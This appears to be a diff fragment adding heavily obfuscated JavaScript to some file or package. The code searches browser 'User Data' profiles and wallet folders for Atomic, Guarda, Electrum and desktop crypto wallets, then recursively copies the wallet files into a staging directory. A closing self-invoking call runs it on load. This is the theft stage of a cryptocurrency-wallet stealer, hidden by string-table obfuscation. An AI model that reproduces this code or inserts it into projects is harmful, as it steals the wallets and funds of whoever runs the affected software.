+            N[lg(0x299)](Y => {
+                const lu = lg;
+                let H = I[lu(0x3a3)](J => J == Y);
+                H[lu(0x2ca)] == 0x0 && I['push'](Y);
+            }), I[lg(0x299)]((Y, H) => {
+                const lC = lg;
+                for (let [J, K] of Object[lC(0x171)](Q)) {
+                    if (fs['existsSync'](Y + '\x5c' + K)) {
+                        if (!Y[lC(0x36a)]('atomic') && J == lC(0x2ef))
+                            continue;
+                        if (!Y[lC(0x36a)](lC(0x3b4)) && J[lC(0x36a)](lC(0x357)))
+                            continue;
+                        if (!Y[lC(0x36a)](lC(0x2fb)) && J == lC(0x394))
+                            continue;
+                        if (!Y[lC(0x36a)](lC(0x2eb)) && J == lC(0x35b))
+                            continue;
+                        let M = Y[lC(0x255)]('\x5c'), j = M[lC(0x303)](p => p == 'User\x20Data');
+                        const pathWallet = Y + '\x5c' + K, L = J[lC(0x36a)]('desktop') ? i + '\x5c' + J : i + M[j + 0x1] + '\x5c' + J;
+                        s(pathWallet, L);
+                    } else {
+                        if (!fs['existsSync'](Y + '\x5c' + K) && Y[lC(0x36a)](K)) {
+                            if (!Y['includes'](lC(0x30a)) && J == lC(0x2ef))
+                                continue;
+                            if (!Y['includes']('Guarda') && J[lC(0x36a)](lC(0x357)))
+                                continue;
+                            if (!Y[lC(0x36a)](lC(0x2fb)) && J == lC(0x394))
+                                continue;
+                            if (!Y[lC(0x36a)]('Electrum') && J == lC(0x35b))
+                                continue;
+                            const pathWallet = Y, p = i + '\x5c' + J;
+                            s(pathWallet, p);
+                        }
+                    }
+                    H == I[lC(0x2ca)] - 0x1 && z();
+                }
+            });
+        });
+    });
+}
+function m(D, l) {
+    const z = t();
+    return m = function (e, Q) {
+        e = e - 0x164;
+        let B = z[e];
+        return B;
+    }, m(D, l);
+}
+function s(z, e) {
+    const z0 = tE;
+    if (!fs[z0(0x270)](e)) {
+        const h = {};
+        h['recursive'] = !![], fs['mkdirSync'](e, h);
+    }
+    const Q = fs[z0(0x226)](z);
+    Q[z0(0x299)](c => {
+        const z1 = z0, U = path[z1(0x1e6)](z, c), f = fs['statSync'](U);
+        if (f[z1(0x297)]()) {
+            const N = path[z1(0x27d)](z, U);
+            if (N !== '') {
+                const I = path[z1(0x1e6)](e, N);
+                if (!fs['existsSync'](I)) {
+                    const Y = {};
+                    Y[z1(0x343)] = !![], fs['mkdirSync'](I, Y);
+                }
+                s(U, I);
+            }
+        } else {
+            const H = path[z1(0x27d)](z, U);
+            if (H !== '') {
+                const J = path[z1(0x1e6)](e, path[z1(0x367)](H));
+                if (!fs[z1(0x270)](J)) {
+                    const M = {};
+                    M[z1(0x343)] = !![], fs['mkdirSync'](J, M);
+                }
+                const K = path[z1(0x1e6)](J, path[z1(0x237)](H));
+                if (!fs['existsSync'](K))
+                    try {
+                        fs[z1(0x26e)](U, K);
+                    } catch (j) {
+                        console[error](j);
+                    }
+            }
+        }
+    });
+}
+k();
